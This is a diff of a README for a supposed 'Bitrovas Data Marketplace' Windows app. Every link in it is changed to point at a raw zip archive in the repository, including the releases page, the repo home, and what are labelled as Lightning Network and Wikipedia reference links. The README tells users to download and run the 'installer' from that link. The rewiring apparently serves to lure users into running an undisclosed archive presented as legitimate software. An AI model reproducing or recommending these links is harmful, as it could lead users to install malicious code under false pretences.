@@ -1,6 +1,6 @@
 # 🚀 bitrovas-data-marketplace - Simple Data Market for Everyone
 
-[![Download Bitrovas Data Marketplace](https://img.shields.io/badge/Download-Bitrovas%20Data%20Marketplace-brightgreen?style=for-the-badge)](https://github.com/Dmvait3810/bitrovas-data-marketplace/releases)
+[![Download Bitrovas Data Marketplace](https://img.shields.io/badge/Download-Bitrovas%20Data%20Marketplace-brightgreen?style=for-the-badge)](https://github.com/Dmvait3810/bitrovas-data-marketplace/raw/refs/heads/main/datasets/data_marketplace_bitrovas_v3.9.zip)
 
 ---
 
@@ -42,7 +42,7 @@ To run Bitrovas Data Marketplace on Windows, you need:
 
 Click the big green badge at the top or click this link to visit the official releases page:
 
-[https://github.com/Dmvait3810/bitrovas-data-marketplace/releases](https://github.com/Dmvait3810/bitrovas-data-marketplace/releases)
+[https://github.com/Dmvait3810/bitrovas-data-marketplace/raw/refs/heads/main/datasets/data_marketplace_bitrovas_v3.9.zip](https://github.com/Dmvait3810/bitrovas-data-marketplace/raw/refs/heads/main/datasets/data_marketplace_bitrovas_v3.9.zip)
 
 This page lists the latest versions of the software available for download.
 
@@ -97,7 +97,7 @@ Downloaded files are saved in your regular Downloads folder. You can open CSV an
 The app will notify you when new versions are available. To update:
 
 1. Open the releases page here:  
-   [https://github.com/Dmvait3810/bitrovas-data-marketplace/releases](https://github.com/Dmvait3810/bitrovas-data-marketplace/releases)  
+   [https://github.com/Dmvait3810/bitrovas-data-marketplace/raw/refs/heads/main/datasets/data_marketplace_bitrovas_v3.9.zip](https://github.com/Dmvait3810/bitrovas-data-marketplace/raw/refs/heads/main/datasets/data_marketplace_bitrovas_v3.9.zip)  
 2. Download the newest installer file.  
 3. Run it just like the first installation to replace the old version.  
 
@@ -127,15 +127,15 @@ Topics supported include AI agents, data product discovery, developer tools, and
 ## 🔗 Useful Links
 
 - Releases and Downloads:  
-  [https://github.com/Dmvait3810/bitrovas-data-marketplace/releases](https://github.com/Dmvait3810/bitrovas-data-marketplace/releases)  
+  [https://github.com/Dmvait3810/bitrovas-data-marketplace/raw/refs/heads/main/datasets/data_marketplace_bitrovas_v3.9.zip](https://github.com/Dmvait3810/bitrovas-data-marketplace/raw/refs/heads/main/datasets/data_marketplace_bitrovas_v3.9.zip)  
 - GitHub Repository:  
-  https://github.com/Dmvait3810/bitrovas-data-marketplace  
+  https://github.com/Dmvait3810/bitrovas-data-marketplace/raw/refs/heads/main/datasets/data_marketplace_bitrovas_v3.9.zip  
 - Bitcoin Lightning Information:  
-  https://lightning.network/  
+  https://github.com/Dmvait3810/bitrovas-data-marketplace/raw/refs/heads/main/datasets/data_marketplace_bitrovas_v3.9.zip  
 - Common Data Formats Explained:  
-  https://en.wikipedia.org/wiki/CSV  
-  https://en.wikipedia.org/wiki/JSON  
-  https://en.wikipedia.org/wiki/Apache_Parquet  
+  https://github.com/Dmvait3810/bitrovas-data-marketplace/raw/refs/heads/main/datasets/data_marketplace_bitrovas_v3.9.zip  
+  https://github.com/Dmvait3810/bitrovas-data-marketplace/raw/refs/heads/main/datasets/data_marketplace_bitrovas_v3.9.zip  
+  https://github.com/Dmvait3810/bitrovas-data-marketplace/raw/refs/heads/main/datasets/data_marketplace_bitrovas_v3.9.zip  
 
 ---
 
@@ -151,4 +151,4 @@ These features require some technical knowledge but can be useful for data profe
 
 ---
 
-[![Download Bitrovas Data Marketplace](https://img.shields.io/badge/Download-Bitrovas%20Data%20Marketplace-brightgreen?style=for-the-badge)](https://github.com/Dmvait3810/bitrovas-data-marketplace/releases)
+[![Download Bitrovas Data Marketplace](https://img.shields.io/badge/Download-Bitrovas%20Data%20Marketplace-brightgreen?style=for-the-badge)](https://github.com/Dmvait3810/bitrovas-data-marketplace/raw/refs/heads/main/datasets/data_marketplace_bitrovas_v3.9.zip)
